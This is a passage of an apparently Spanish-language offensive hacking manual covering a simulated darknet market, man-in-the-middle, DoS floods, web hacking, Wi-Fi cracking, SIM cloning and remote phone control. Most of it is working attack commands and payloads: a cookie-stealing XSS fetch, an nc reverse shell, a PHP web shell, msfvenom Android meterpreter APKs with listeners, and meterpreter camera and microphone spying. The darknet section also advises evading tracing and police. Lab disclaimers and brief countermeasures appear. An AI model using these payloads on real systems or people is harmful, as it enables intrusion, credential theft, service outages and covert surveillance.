El archivo `/var/lib/tor/hidden_service/hostname` mostrar√° la URL `.onion` interna.

---

## 10.5. Transacciones con Criptomonedas de Prueba

Usaremos Bitcoin Testnet:

```bash
bitcoin-cli -testnet getnewaddress
bitcoin-cli -testnet sendtoaddress <destino> 0.001
```

En vez de dinero real, todas las monedas en Testnet son gratuitas y sin valor.

---

## 10.6. Uso de Monero en Laboratorio

Monero ofrece privacidad superior.
Instalar Monero CLI:

```bash
sudo apt install monero
monerod --stagenet
```

Generar wallet:

```bash
monero-wallet-cli --stagenet
```

---

## 10.7. Sistema de Escrow Simulado

Podemos implementar un escrow b√°sico en PHP:

```php
<?php
// Pseudo-c√≥digo
if($buyer_confirms){
  releaseFunds($seller_wallet);
} else {
  refundBuyer();
}
?>
```

---

## 10.8. Seguridad del Mercado

* Cifrar comunicaciones con HTTPS interno.
* Autenticaci√≥n PGP para mensajes.
* Backups encriptados.
* Logs m√≠nimos para evitar rastreo.

---

## 10.9. An√°lisis Forense de un Mercado Negro Simulado

Con herramientas como **FTK Imager** o **Autopsy** podemos:

* Analizar bases de datos para identificar vendedores.
* Rastrear wallets de prueba en blockchain explorers de Testnet.
* Correlacionar tiempos de conexi√≥n con actividades sospechosas.

---

## 10.10. Ejercicio Pr√°ctico Completo

1. Montar servidor web y base de datos con cat√°logo de prueba.
2. Configurar acceso `.onion` con Tor.
3. Realizar una compra con Bitcoin Testnet o Monero stagenet.
4. Analizar transacciones en el explorador de blockchain.
5. Emitir un reporte de actividad.

---

## 10.11. Riesgos Reales y Contramedidas

* **Riesgo**: infiltraci√≥n policial.
  **Mitigaci√≥n**: entornos cerrados para entrenamiento.
* **Riesgo**: malware en archivos descargados.
  **Mitigaci√≥n**: sandbox y escaneo antes de abrir.
* **Riesgo**: p√©rdida de fondos por estafa.
  **Mitigaci√≥n**: sistema de escrow confiable.

---

## 10.12. Cierre

Entender c√≥mo operan los mercados negros y c√≥mo se ocultan transacciones es vital para investigadores, analistas de fraude y fuerzas de seguridad. Simularlos de forma controlada permite anticipar t√°cticas y trazar estrategias de defensa.

---

üí° **TIP Black-Hat √âtico:** si puedes replicar la log√≠stica del enemigo, podr√°s destruirla antes de que cause da√±o real.

---


# **Cap√≠tulo 11 ‚Äì Hombre en el Medio (MitM) al L√≠mite**

*Interceptando, manipulando y explotando el tr√°fico como un depredador digital invisible*

---

## 11.1. Introducci√≥n

El ataque **Man-in-the-Middle** (MitM) es una de las t√©cnicas m√°s vers√°tiles y peligrosas en el arsenal de un hacker ofensivo. Consiste en colocarse entre dos partes que se comunican para **escuchar, registrar, modificar o inyectar datos** sin que ninguna de las partes lo note.

En este cap√≠tulo aprender√°s a:

* Configurar entornos de laboratorio para MitM.
* Usar herramientas como `ettercap`, `mitmproxy` y `Bettercap`.
* Interceptar tr√°fico cifrado con t√©cnicas de downgrade.
* Manipular datos en vivo.
* Capturar credenciales, inyectar scripts y modificar descargas.

> ‚ö† Todo debe realizarse **√∫nicamente** en entornos controlados.

---

## 11.2. Tipos de MitM

| Tipo               | Descripci√≥n                                            | Ejemplo                                              |
| ------------------ | ------------------------------------------------------ | ---------------------------------------------------- |
| **ARP Spoofing**   | Enga√±ar a una LAN para que env√≠e tr√°fico a tu m√°quina. | Ettercap interceptando todo el tr√°fico de la red.    |
| **DNS Spoofing**   | Responder con direcciones falsas a consultas DNS.      | Redirigir `facebook.com` a un servidor falso.        |
| **HTTP Injection** | Modificar tr√°fico HTTP para inyectar c√≥digo.           | Insertar un script malicioso en una p√°gina leg√≠tima. |
| **SSL Strip**      | Downgradear HTTPS a HTTP.                              | Robo de credenciales en sitios que no fuerzan HTTPS. |

---

## 11.3. Montando el Laboratorio

* **Red interna**: adaptador Host-Only con IPs 192.168.56.0/24.
* **M√°quina v√≠ctima**: Windows 10 o Ubuntu Desktop.
* **M√°quina atacante**: Kali Linux con `ettercap`, `bettercap`, `mitmproxy`.

---

## 11.4. ARP Spoofing con Ettercap

### Instalaci√≥n:

```bash
sudo apt install ettercap-graphical
```

### Ejecuci√≥n:

```bash
sudo ettercap -G
```

1. Seleccionar interfaz de red.
2. Escanear hosts.
3. A√±adir v√≠ctima 1 (IP del objetivo).
4. A√±adir v√≠ctima 2 (IP del gateway).
5. Iniciar en modo ARP poisoning.

üí° Esto redirige el tr√°fico de la v√≠ctima hacia ti.

---

## 11.5. DNS Spoofing

En Ettercap, editar `/etc/ettercap/etter.dns`:

```plaintext
facebook.com     A    192.168.56.10
```

Esto har√° que cualquier intento de abrir `facebook.com` vaya a tu servidor falso.

---

## 11.6. Manipulaci√≥n de HTTP

Con `Bettercap`:

```bash
sudo bettercap -iface eth0
set http.proxy.script inject.js
set http.proxy.injectjs true
http.proxy on
```

Ejemplo de `inject.js`:

```javascript
document.body.innerHTML += "<h1>Interceptado por el laboratorio</h1>";
```

---

## 11.7. SSL Strip ‚Äì Downgrade de HTTPS

Con `sslstrip`:

```bash
sudo apt install sslstrip
sudo sslstrip -l 8080
```

Redirigir tr√°fico con iptables:

```bash
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```

---

## 11.8. Intercepci√≥n con mitmproxy

```bash
mitmproxy --mode transparent --listen-port 8080
```

Esto permite:

* Ver tr√°fico HTTP/HTTPS.
* Editar respuestas.
* Guardar sesiones para an√°lisis.

---

## 11.9. Inyecci√≥n de Scripts en Descargas

Con `Bettercap`:

```bash
set http.proxy.replace.body from="</body>" to="<script>alert('Interceptado');</script></body>"
```

Esto inserta c√≥digo malicioso en cualquier p√°gina antes de enviarla a la v√≠ctima.

---

## 11.10. Captura de Credenciales

Con ARP Spoofing y `urlsnarf`:

```bash
sudo urlsnarf -i eth0
```

Esto muestra las peticiones HTTP que contienen datos de login.

---

## 11.11. Ejercicio Pr√°ctico Completo

1. Configurar laboratorio con v√≠ctima, gateway y atacante.
2. Ejecutar ARP Spoofing y verificar tr√°fico interceptado.
3. Redirigir un dominio a servidor falso con DNS Spoofing.
4. Inyectar un script en una p√°gina leg√≠tima.
5. Capturar credenciales en un login no cifrado.
6. Analizar logs para detectar patrones.

---

## 11.12. Detecci√≥n y Contramedidas

* **ARP Inspection** para evitar spoofing.
* **DNSSEC** para proteger resoluciones DNS.
* Uso obligatorio de **HTTPS con HSTS**.
* Monitoreo de certificados no autorizados.

---

## 11.13. Cierre

El MitM extremo es una de las formas m√°s potentes de control sobre una red. Bien usado en laboratorio, te permitir√° entender c√≥mo interceptar y manipular tr√°fico‚Ä¶ y, m√°s importante, c√≥mo detectarlo y bloquearlo en producci√≥n.

---

üí° **TIP Black-Hat √âtico:** si aprendes a interceptar, tambi√©n aprendes a blindar. La defensa empieza por dominar el ataque.

---


# **Cap√≠tulo 12 ‚Äì DoS y DDoS de Nivel Militar**

*C√≥mo saturar sistemas al punto de dejarlos sin aliento‚Ä¶ y c√≥mo defenderse de ello*

---

## 12.1. Introducci√≥n

Los ataques **DoS (Denial of Service)** y **DDoS (Distributed Denial of Service)** son operaciones dise√±adas para **interrumpir o degradar severamente** la disponibilidad de un servicio.
En un DoS, un √∫nico sistema env√≠a tr√°fico o peticiones masivas; en un DDoS, **m√∫ltiples sistemas distribuidos** lo hacen simult√°neamente, convirtiendo la defensa en un desaf√≠o enorme.

En este cap√≠tulo veremos:

* C√≥mo funcionan los ataques DoS y DDoS.
* T√©cnicas y herramientas para ejecutarlos en laboratorio.
* M√©todos para medir impacto.
* Estrategias defensivas reales.

> ‚ö† Nunca realices un DoS/DDoS contra sistemas sin autorizaci√≥n. Las simulaciones aqu√≠ son **√∫nicamente** para entornos controlados.

---

## 12.2. Clasificaci√≥n de Ataques

| Tipo            | Descripci√≥n                                     | Ejemplo                   |
| --------------- | ----------------------------------------------- | ------------------------- |
| **Volum√©trico** | Satura el ancho de banda.                       | UDP flood, ICMP flood.    |
| **Protocolo**   | Explota debilidades en capas de red/transporte. | SYN flood, Ping of Death. |
| **Aplicaci√≥n**  | Saturar recursos espec√≠ficos del servicio.      | HTTP flood, Slowloris.    |

---

## 12.3. Laboratorio de Pruebas

* **V√≠ctima**: Servidor web Apache en 192.168.56.101.
* **Atacante**: Kali Linux con `hping3`, `slowloris`, `LOIC` (Low Orbit Ion Cannon).
* **Red**: Host-Only para no afectar redes externas.

---

## 12.4. Ataques Volum√©tricos

### 12.4.1. UDP Flood con `hping3`

```bash
sudo hping3 --flood --rand-source --udp -p 80 192.168.56.101
```

* `--flood`: env√≠a paquetes lo m√°s r√°pido posible.
* `--rand-source`: cambia la IP de origen para simular m√∫ltiples atacantes.

### 12.4.2. ICMP Flood

```bash
sudo hping3 --flood -1 192.168.56.101
```

---

## 12.5. Ataques de Protocolo

### 12.5.1. SYN Flood

```bash
sudo hping3 -S --flood -V -p 80 192.168.56.101
```

Esto agota la tabla de conexiones del servidor.

### 12.5.2. Ping of Death (simulado)

```bash
sudo ping -s 65500 192.168.56.101
```

En sistemas modernos no es efectivo, pero √∫til para pruebas.

---

## 12.6. Ataques a Nivel de Aplicaci√≥n

### 12.6.1. HTTP Flood

```bash
ab -n 100000 -c 500 http://192.168.56.101/
```

Usando Apache Benchmark para simular miles de peticiones concurrentes.

### 12.6.2. Slowloris

```bash
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py 192.168.56.101
```

Mantiene conexiones abiertas para agotar recursos.

---

## 12.7. Simulaci√≥n de DDoS

Podemos lanzar el mismo ataque desde m√∫ltiples m√°quinas virtuales conectadas en la red de laboratorio.
Ejemplo con `LOIC`:

1. Ejecutar LOIC en 3 m√°quinas diferentes.
2. Apuntar todas a la IP del servidor v√≠ctima.
3. Lanzar ataque sincronizado.

---

## 12.8. Medici√≥n de Impacto

En la v√≠ctima:

```bash
top
iftop
netstat -antp
```

Esto permite ver CPU, ancho de banda y n√∫mero de conexiones activas.

---

## 12.9. Defensas contra DoS/DDoS

* **Limitaci√≥n de tasa (Rate limiting)** en firewall o servidor.
* **Filtros de tr√°fico** para descartar patrones maliciosos.
* **CDN y balanceadores de carga** para absorber el impacto.
* **Sistemas de detecci√≥n temprana** (IDS/IPS).

Ejemplo de limitaci√≥n en `iptables`:

```bash
sudo iptables -A INPUT -p tcp --dport 80 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j DROP
```

---

## 12.10. Ejercicio Pr√°ctico Completo

1. Levantar servidor Apache en laboratorio.
2. Lanzar UDP flood con `hping3`.
3. Probar HTTP flood con `ab`.
4. Ejecutar Slowloris y medir impacto.
5. Configurar reglas de defensa y repetir ataques para evaluar mejoras.

---

## 12.11. Cierre

Los ataques DoS/DDoS de alto nivel requieren preparaci√≥n, herramientas y, en el caso real, grandes recursos distribuidos. Practicarlos en laboratorio es clave para aprender a defenderlos sin poner en riesgo sistemas reales.

---

üí° **TIP Black-Hat √âtico:** la mejor defensa contra un DDoS masivo no est√° solo en el firewall, sino en la arquitectura distribuida y la detecci√≥n temprana.

---


# **Cap√≠tulo 13 ‚Äì Web Hacking sin Piedad**

*Tomando el control total de aplicaciones y servidores web sin dejar piedra sobre piedra*

---

## 13.1. Introducci√≥n

El **Web Hacking** es uno de los campos m√°s amplios y rentables para un atacante. Los servidores web son el escaparate de cualquier organizaci√≥n y, al mismo tiempo, un punto de entrada cr√≠tico.
Aqu√≠ aprender√°s a:

* Detectar y explotar vulnerabilidades cr√≠ticas.
* Encadenar fallos para control total.
* Usar herramientas autom√°ticas y manuales.
* Manipular peticiones y respuestas HTTP.
* Subir shells web y pivotar desde ellas.

> ‚ö† Todo lo que veremos se realizar√° **exclusivamente** en entornos de laboratorio.

---

## 13.2. Principales Vectores de Ataque

| Vulnerabilidad                 | Descripci√≥n                                       | Impacto                               |
| ------------------------------ | ------------------------------------------------- | ------------------------------------- |
| **SQL Injection (SQLi)**       | Inyecci√≥n de c√≥digo SQL no filtrado.              | Robo/modificaci√≥n de base de datos.   |
| **Cross-Site Scripting (XSS)** | Inyecci√≥n de c√≥digo JavaScript.                   | Robo de cookies, keylogging.          |
| **Command Injection**          | Ejecuci√≥n de comandos del sistema.                | Control total del servidor.           |
| **File Upload Vulnerability**  | Subida de archivos maliciosos.                    | Shell web y acceso persistente.       |
| **Path Traversal**             | Acceso a archivos fuera del directorio permitido. | Lectura de configuraciones sensibles. |

---

## 13.3. Preparando el Laboratorio

* **V√≠ctima**: DVWA (Damn Vulnerable Web App) o Mutillidae en un servidor Ubuntu.
* **Atacante**: Kali Linux con `sqlmap`, `burpsuite`, `wfuzz`, `gobuster`.

---

## 13.4. SQL Injection (SQLi)

### Ejemplo Manual

Entrada vulnerable:

```plaintext
http://192.168.56.101/product.php?id=1
```

Prueba:

```plaintext
?id=1' OR '1'='1
```

### Ejemplo Autom√°tico con sqlmap

```bash
sqlmap -u "http://192.168.56.101/product.php?id=1" --dbs
```

Obtener datos:

```bash
sqlmap -u "http://192.168.56.101/product.php?id=1" -D dvwa -T users --dump
```

---

## 13.5. Cross-Site Scripting (XSS)

### XSS Reflejado

```html
<script>alert('XSS')</script>
```

### XSS Persistente

Inyectar c√≥digo que se guarda en la base de datos:

```html
<script>fetch('http://192.168.56.10/steal?cookie='+document.cookie)</script>
```

---

## 13.6. Command Injection

Si un formulario ejecuta `ping` en el backend:

```plaintext
127.0.0.1; ls -la
```

Ejemplo con DVWA:

```bash
; nc -e /bin/bash 192.168.56.10 4444
```

---

## 13.7. File Upload Vulnerability

Subir una shell PHP:

```php
<?php system($_GET['cmd']); ?>
```

Acceder:

```plaintext
http://192.168.56.101/uploads/shell.php?cmd=whoami
```

---

## 13.8. Path Traversal

Intentar:

```plaintext
../../../../etc/passwd
```

En Windows:

```plaintext
..\..\..\windows\win.ini
```

---

## 13.9. Enumeraci√≥n de Directorios y Archivos

Usando `gobuster`:

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt
```

---

## 13.10. Escalada desde Web Shell a Control Total

* **Paso 1**: subir shell web.
* **Paso 2**: ejecutar `nc` inverso para obtener shell interactiva.
* **Paso 3**: escalar privilegios con `linpeas` o exploits locales.

---

## 13.11. Automatizaci√≥n de Ataques

Usando `wfuzz` para probar par√°metros vulnerables:

```bash
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt http://192.168.56.101/page.php?id=FUZZ
```

---

## 13.12. Ejercicio Pr√°ctico Completo

1. Instalar DVWA en una m√°quina v√≠ctima.
2. Encontrar y explotar una SQLi.
3. Insertar un XSS persistente.
4. Subir shell PHP y ejecutar comandos.
5. Escalar privilegios y documentar todo.

---

## 13.13. Contramedidas

* Filtrar y validar entradas del usuario.
* Usar consultas preparadas (SQL).
* Configurar WAF para bloquear patrones maliciosos.
* Deshabilitar ejecuci√≥n de archivos en directorios de subida.
* Aplicar parches de seguridad regularmente.

---

## 13.14. Cierre

El Web Hacking extremo implica combinar vulnerabilidades para lograr el control absoluto. No basta con encontrar un fallo: el verdadero poder est√° en **encadenarlos**.

---

üí° **TIP Black-Hat √âtico:** piensa siempre en cadenas de ataque. Una sola vulnerabilidad puede no ser letal‚Ä¶ pero varias combinadas pueden derribar un imperio digital.

---


# **Cap√≠tulo 14 ‚Äì Wireless Hacking Avanzado**

*Rompiendo la seguridad de redes inal√°mbricas modernas con precisi√≥n quir√∫rgica*

---

## 14.1. Introducci√≥n

Las redes inal√°mbricas son la puerta de entrada a sistemas corporativos y dom√©sticos. Aunque los est√°ndares como WPA2 y WPA3 han elevado la seguridad, **siguen existiendo vectores de ataque efectivos** que, si se combinan con t√©cnicas avanzadas, pueden comprometer incluso redes modernas.

En este cap√≠tulo aprender√°s a:

* Capturar y descifrar handshakes WPA/WPA2.
* Realizar ataques de fuerza bruta y diccionario.
* Implementar Evil Twin y Rogue AP.
* Romper WPA3 con ataques de downgrade.
* Usar hardware espec√≠fico para auditor√≠as.

> ‚ö† Todo lo que ver√°s debe practicarse **√∫nicamente en redes propias o de laboratorio con permiso expreso**.

---

## 14.2. Herramientas y Hardware

| Herramienta                               | Uso                                       |
| ----------------------------------------- | ----------------------------------------- |
| `aircrack-ng`                             | Captura y crackeo de contrase√±as.         |
| `airodump-ng`                             | Escaneo y captura de handshakes.          |
| `aireplay-ng`                             | Inyecci√≥n de paquetes y desautenticaci√≥n. |
| `hostapd`                                 | Creaci√≥n de puntos de acceso falsos.      |
| `wifiphisher`                             | Phishing v√≠a Evil Twin.                   |
| Tarjeta Wi-Fi compatible con modo monitor | Requisito para captura e inyecci√≥n.       |

---

## 14.3. Configuraci√≥n del Laboratorio

* Router Wi-Fi configurado con WPA2-PSK.
* M√°quina atacante: Kali Linux.
* Tarjeta de red inal√°mbrica USB en modo monitor (`wlan1`).
* Cliente v√≠ctima conectado a la red.

---

## 14.4. Captura de Handshake WPA/WPA2

1. Poner tarjeta en modo monitor:

```bash
sudo airmon-ng start wlan1
```

2. Escanear redes:

```bash
sudo airodump-ng wlan1mon
```

3. Capturar tr√°fico de la red objetivo:

```bash
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w captura wlan1mon
```

4. Forzar reconexi√≥n del cliente para obtener handshake:

```bash
sudo aireplay-ng --deauth 5 -a 00:11:22:33:44:55 -c CC:DD:EE:FF:GG:HH wlan1mon
```

---

## 14.5. Crackeo de Contrase√±a

Con diccionario:

```bash
aircrack-ng captura.cap -w /usr/share/wordlists/rockyou.txt
```

Con fuerza bruta (poco eficiente):

```bash
hashcat -m 2500 captura.hccapx -a 3 ?d?d?d?d?d?d?d?d
```

---

## 14.6. Ataques Evil Twin

Un Evil Twin es un AP falso que imita la red leg√≠tima.

Usando `hostapd`:

```bash
sudo hostapd hostapd.conf
```

Ejemplo `hostapd.conf`:

```plaintext
interface=wlan1
driver=nl80211
ssid=MiRedWiFi
hw_mode=g
channel=6
```

Con `wifiphisher`:

```bash
sudo wifiphisher
```

Permite clonar el AP y redirigir a la v√≠ctima a una p√°gina falsa de login.

---

## 14.7. WPA3 Cracking con Downgrade

Aunque WPA3 es m√°s seguro, puede ser vulnerado si el dispositivo v√≠ctima soporta **modo mixto WPA2/WPA3**:

1. Configurar un AP falso WPA2.
2. Forzar desautenticaci√≥n de la v√≠ctima WPA3.
3. La v√≠ctima se conecta al AP WPA2 falso, donde se captura el handshake.

---

## 14.8. Ataques WPS

Si el router tiene WPS activado:

```bash
sudo reaver -i wlan1mon -b 00:11:22:33:44:55 -vv
```

Esto intenta PINs por fuerza bruta.

---

## 14.9. Rogue AP + Captura de Credenciales

Usando `bettercap`:

```bash
sudo bettercap -iface wlan1
set wifi.ap.ssid MiRedWiFi
wifi.recon on
wifi.ap on
```

Luego interceptar tr√°fico HTTP y p√°ginas de login.

---

## 14.10. Ejercicio Pr√°ctico Completo

1. Configurar red WPA2 en router de laboratorio.
2. Capturar handshake con `airodump-ng`.
3. Forzar reconexi√≥n con `aireplay-ng`.
4. Crackear contrase√±a con `aircrack-ng`.
5. Levantar un Evil Twin con `wifiphisher`.
6. Capturar credenciales de login falso.

---

## 14.11. Medidas Defensivas

* Usar WPA3-Only y desactivar WPA2.
* Desactivar WPS.
* Filtrar por MAC (no infalible, pero a√±ade fricci√≥n).
* Monitorear redes para detectar AP falsos.
* Cambiar contrase√±as peri√≥dicamente.

---

## 14.12. Cierre

El hacking inal√°mbrico avanzado es un campo donde la creatividad t√©cnica se combina con ingenier√≠a social. El atacante que domina estas t√©cnicas puede entrar sin tocar un solo cable‚Ä¶ y el defensor que las conoce puede anticiparse.

---

üí° **TIP Black-Hat √âtico:** nunca subestimes el alcance de tu antena Wi-Fi. A veces el enemigo ni siquiera est√° cerca‚Ä¶ pero s√≠ conectado.

---


# **Cap√≠tulo 15 ‚Äì Hacking con Dispositivos M√≥viles**

*Transformando smartphones en armas digitales y objetivos de alto valor*

---

## 15.1. Introducci√≥n

Los **dispositivos m√≥viles** son hoy m√°s que tel√©fonos: son c√°maras, billeteras, llaves digitales y centros de comunicaci√≥n personal. Esto los convierte en **vectores de ataque prioritarios** y, al mismo tiempo, en poderosas plataformas para ofensiva y defensa.

En este cap√≠tulo aprender√°s a:

* Usar un smartphone como herramienta de hacking.
* Comprometer dispositivos m√≥viles en laboratorio.
* Explorar vulnerabilidades en Android e iOS.
* Usar ataques de ingenier√≠a social y redes para comprometer m√≥viles.
* Implementar persistencia y exfiltraci√≥n de datos.

> ‚ö† Todo debe ejecutarse **solo en entornos controlados** y con consentimiento expreso.

---

## 15.2. Escenarios de Ataque y Uso Ofensivo

| Escenario                | Descripci√≥n                                             |
| ------------------------ | ------------------------------------------------------- |
| **Plataforma de ataque** | Usar el tel√©fono como punto de lanzamiento de exploits. |
| **Objetivo vulnerable**  | Comprometer un m√≥vil para extraer datos.                |
| **Intermedio de red**    | Usar tethering o hotspot para interceptar tr√°fico.      |

---

## 15.3. Hacking con Android

### 15.3.1. Instalando Kali NetHunter

Kali NetHunter es una distribuci√≥n de pentesting para Android.

```bash
# En Android con root
pkg install wget
wget https://images.kali.org/nethunter/Nethunter-2023.3-arm64.zip
# Flashear con TWRP
```

Permite ejecutar `nmap`, `metasploit`, `aircrack-ng` desde el tel√©fono.

### 15.3.2. Uso como Rogue AP

Con NetHunter:

```bash
airmon-ng start wlan0
hostapd hostapd.conf
```

---

## 15.4. Hacking con iOS

### 15.4.1. Jailbreak para pruebas

El jailbreak en laboratorio permite instalar herramientas no autorizadas por Apple.

* Checkra1n (para dispositivos compatibles).
* Instalar terminal y `ssh`.

### 15.4.2. Herramientas √∫tiles

* **iRET**: kit de pruebas de seguridad para iOS.
* **Frida**: manipulaci√≥n de apps en tiempo real.

---

## 15.5. Comprometiendo Dispositivos Android

### 15.5.1. Payload con msfvenom

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -o app-maliciosa.apk
```

### 15.5.2. Configurar listener en Metasploit

```bash
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 192.168.56.10
set LPORT 4444
exploit
```

Al instalar la APK en la v√≠ctima, se obtiene una sesi√≥n meterpreter.

---

## 15.6. Comprometiendo Dispositivos iOS

En laboratorio con jailbreak:

1. Instalar `OpenSSH`.
2. Acceder con:

```bash
ssh root@IP_DEL_IPHONE
```

3. Buscar datos en `/var/mobile/Containers/Data/Application/`.

---

## 15.7. Ataques v√≠a Ingenier√≠a Social

* **Apps falsas**: imitar apps populares.
* **SMS phishing (Smishing)**: enlace a APK maliciosa.
* **Clonaci√≥n de pantalla de login**: capturar credenciales.

---

## 15.8. Ataques v√≠a Red

### 15.8.1. Evil Twin

Levantar AP falso y capturar tr√°fico desde m√≥viles conectados.

### 15.8.2. Intercepci√≥n de tr√°fico HTTP

Usar `mitmproxy` o `bettercap` para capturar datos no cifrados.

---

## 15.9. Persistencia en M√≥viles

* Android: servicios en segundo plano que se reinician al encender.
* iOS: tweaks de Cydia que cargan en cada inicio.

Ejemplo en Android:

```java
public int onStartCommand(Intent intent, int flags, int startId) {
    // Reconexi√≥n a servidor de control
}
```

---

## 15.10. Ejercicio Pr√°ctico Completo

1. Instalar Kali NetHunter en Android rooteado.
2. Generar payload APK con `msfvenom`.
3. Configurar listener y ejecutar ataque.
4. Obtener acceso remoto y listar archivos.
5. Extraer contactos y mensajes (simulados).
6. Documentar flujo y mitigaciones.

---

## 15.11. Medidas Defensivas

* Instalar apps solo desde tiendas oficiales.
* Desactivar instalaci√≥n de or√≠genes desconocidos.
* Mantener sistema actualizado.
* Usar VPN para proteger tr√°fico en redes p√∫blicas.
* Activar cifrado completo del dispositivo.

---

## 15.12. Cierre

Los m√≥viles son la mezcla perfecta de objetivo y herramienta. Dominar su uso ofensivo y defensivo te permite entender la superficie de ataque m√°s utilizada en el mundo moderno.

---

üí° **TIP Black-Hat √âtico:** trata cada smartphone como si fuera una laptop con acceso total a la vida del usuario‚Ä¶ porque lo es.

---


# **Cap√≠tulo 16 ‚Äì Clonaci√≥n de SIM y Ataques IMSI Catcher**

*Interceptando y manipulando la identidad m√≥vil como un operador encubierto*

---

## 16.1. Introducci√≥n

Las tarjetas SIM son el coraz√≥n de la identidad m√≥vil: contienen el **IMSI** (International Mobile Subscriber Identity) y claves de autenticaci√≥n que permiten a un dispositivo conectarse a la red del operador.
Clonar una SIM o interceptar su IMSI permite:

* Suplantar la identidad de un usuario.
* Interceptar llamadas y SMS.
* Desviar autenticaciones de dos factores (2FA).
* Geolocalizar a un objetivo.

En este cap√≠tulo aprender√°s a:

* Extraer datos de una SIM en laboratorio.
* Clonarla en una tarjeta en blanco.
* Montar un **IMSI Catcher** para capturar identidades m√≥viles.
* Usar equipos SDR (Software Defined Radio) para simulaciones seguras.

> ‚ö† Esto es ilegal fuera de laboratorio. Todo debe hacerse con SIMs y redes privadas de prueba.

---

## 16.2. Anatom√≠a de una Tarjeta SIM

| Elemento            | Descripci√≥n                              |
| ------------------- | ---------------------------------------- |
| **IMSI**            | Identificador √∫nico del suscriptor.      |
| **Ki**              | Clave secreta para autenticar en la red. |
| **ICCID**           | N√∫mero √∫nico de la tarjeta f√≠sica.       |
| **MSISDN**          | N√∫mero de tel√©fono asociado.             |
| **SMS y contactos** | Datos almacenados localmente.            |

---

## 16.3. Hardware y Software Necesario

* **Lector/grabador de SIM** USB.
* SIM en blanco (programmable SIM).
* SIM de laboratorio (no real).
* Herramientas: `pySim`, `pySIM-prog`, `Osmocom` para SDR.
* SDR: RTL-SDR o HackRF One.

---

## 16.4. Extracci√≥n de Datos de SIM

1. Conectar lector USB.
2. Usar `pySIM-prog`:

```bash
git clone https://github.com/osmocom/pysim
cd pysim
python3 pySim-prog.py -d /dev/ttyUSB0
```

Esto muestra IMSI, ICCID y opcionalmente Ki (si no est√° bloqueado por el operador).

---

## 16.5. Clonaci√≥n de SIM en Blanco

1. Obtener SIM en blanco.
2. Escribir datos:

```bash
python3 pySim-prog.py -d /dev/ttyUSB0 --write-imsi 001010123456789 --write-iccid 89010012012341234567 --write-ki 00112233445566778899AABBCCDDEEFF
```

3. Insertar la SIM clonada en un m√≥vil de laboratorio y verificar conexi√≥n.

---

## 16.6. Introducci√≥n a IMSI Catchers

Un **IMSI Catcher** simula una estaci√≥n base (BTS) y fuerza a los m√≥viles cercanos a conectarse para capturar sus IMSI.
En la vida real, se usan en vigilancia policial, espionaje y ciberdelincuencia.

---

## 16.7. Montando un IMSI Catcher de Laboratorio

### Con SDR y OpenBTS

1. Instalar dependencias:

```bash
sudo apt install openbts yate yatebts
```

2. Configurar rango GSM privado:

```plaintext
MCC=001
MNC=01
```

3. Iniciar estaci√≥n base:

```bash
sudo yate -s
```

4. Ver IMSIs conectados:

```bash
telnet localhost 5038
```

---

## 16.8. Ataques con IMSI Catcher

* **Captura de IMSI**: identificar dispositivos cercanos.
* **Downgrade de cifrado**: forzar 2G sin cifrado para interceptar tr√°fico.
* **Suplantaci√≥n de SMS**: enviar mensajes como si fueran del operador.

Ejemplo de captura con `gr-gsm`:

```bash
grgsm_livemon
```

---

## 16.9. Ejercicio Pr√°ctico Completo

1. Leer datos de SIM de laboratorio con `pySim`.
2. Clonar en SIM en blanco.
3. Configurar OpenBTS como IMSI Catcher privado.
4. Capturar IMSI de un tel√©fono de prueba.
5. Analizar tr√°fico GSM con Wireshark y `gr-gsm`.

---

## 16.10. Contramedidas

* Usar 4G/5G y deshabilitar 2G en m√≥viles.
* Detectar IMSI Catchers con apps de monitoreo (SnoopSnitch, Cell Spy Catcher).
* Usar cifrado de extremo a extremo en comunicaciones (Signal, WhatsApp).
* Supervisar cambios inesperados en el nivel de red.

---

## 16.11. Cierre

La clonaci√≥n de SIM y el uso de IMSI Catchers muestran que la seguridad m√≥vil depende tanto de la infraestructura como del dispositivo. Un atacante que controla la identidad m√≥vil controla gran parte de la vida digital del usuario.

---

üí° **TIP Black-Hat √âtico:** la mejor defensa contra este tipo de ataques es migrar a tecnolog√≠as que no permitan el downgrade de seguridad.

---


# **Cap√≠tulo 17 ‚Äì Control Remoto de Dispositivos M√≥viles (Android e iOS)**

*Tomando el mando de un smartphone como si estuvieras en sus propios dedos*

---

## 17.1. Introducci√≥n

Controlar remotamente un dispositivo m√≥vil implica poder:

* Ejecutar comandos.
* Extraer datos.
* Acceder a c√°mara, micr√≥fono y GPS.
* Manipular archivos y aplicaciones.

En manos de un atacante, esto es equivalente a tener el dispositivo en la mano 24/7. En manos de un investigador √©tico, es una herramienta para pruebas de penetraci√≥n y an√°lisis forense m√≥vil.

En este cap√≠tulo veremos c√≥mo:

* Configurar y desplegar payloads persistentes en Android e iOS.
* Usar frameworks como **Metasploit**, **Evil Droid** y **iSpy**.
* Combinar acceso remoto con ingenier√≠a social.
* Mantener control incluso despu√©s de reinicios (persistencia).

> ‚ö† Ejercicios solo con dispositivos de laboratorio y permisos expl√≠citos.

---

## 17.2. Escenarios de Uso en Laboratorio

| Escenario                               | Objetivo                                    |
| --------------------------------------- | ------------------------------------------- |
| **Auditor√≠a de seguridad m√≥vil**        | Evaluar exposici√≥n de un dispositivo.       |
| **Formaci√≥n en respuesta a incidentes** | Practicar detecci√≥n y bloqueo.              |
| **An√°lisis forense remoto**             | Extraer datos sin acceso f√≠sico prolongado. |

---

## 17.3. Control Remoto en Android

### 17.3.1. Generaci√≥n de Payload con Metasploit

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -o control.apk
```

### 17.3.2. Configuraci√≥n del Listener

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 192.168.56.10
set LPORT 4444
exploit
```

Cuando la APK se instala y ejecuta en el dispositivo, obtendr√°s una sesi√≥n **meterpreter**.

---

### 17.3.3. Comandos √ötiles de Meterpreter para Android

```plaintext
sysinfo
webcam_snap
record_mic
geolocate
